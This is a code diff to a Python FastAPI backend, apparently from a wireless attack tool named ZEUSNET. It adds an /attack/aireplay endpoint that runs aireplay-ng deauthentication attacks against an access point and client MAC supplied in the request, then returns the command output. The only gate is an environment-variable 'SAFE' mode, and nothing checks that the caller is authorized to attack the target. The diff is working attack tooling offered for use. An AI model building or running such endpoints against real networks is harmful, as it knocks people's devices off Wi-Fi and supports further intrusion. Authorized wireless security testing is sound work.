@@ -3,6 +3,7 @@ import subprocess
 import logging
 from fastapi import APIRouter, HTTPException, Query, BackgroundTasks
 from typing import Optional
+from pydantic import BaseModel
 from pathlib import Path
 import tempfile
 
@@ -80,4 +81,37 @@ def aireplay_deauth(
         "channel": channel,
         "msg": "Deauth attack queued and will run on the backend.",
         "logfile": str(AIREPLAY_LOG_DIR / f"deauth_{target_bssid.replace(':','')}_{log_id}.log"),
+    }
+
+
+class AireplayParams(BaseModel):
+    target_mac: str
+    ap_mac: str
+    iface: str
+    count: int = 100
+
+
+@router.post("/attack/aireplay")
+def run_aireplay(params: AireplayParams):
+    mode = os.environ.get("ZEUSNET_MODE", "SAFE")
+    if mode == "SAFE":
+        raise HTTPException(status_code=403, detail="Blocked in SAFE mode")
+
+    cmd = [
+        "aireplay-ng",
+        "--deauth",
+        str(params.count),
+        "-a",
+        params.ap_mac,
+        "-c",
+        params.target_mac,
+        params.iface,
+    ]
+    result = subprocess.run(cmd, capture_output=True, text=True)
+    return {
+        "status": "executed",
+        "command": " ".join(cmd),
+        "stdout": result.stdout,
+        "stderr": result.stderr,
+        "exit_code": result.returncode,
     }
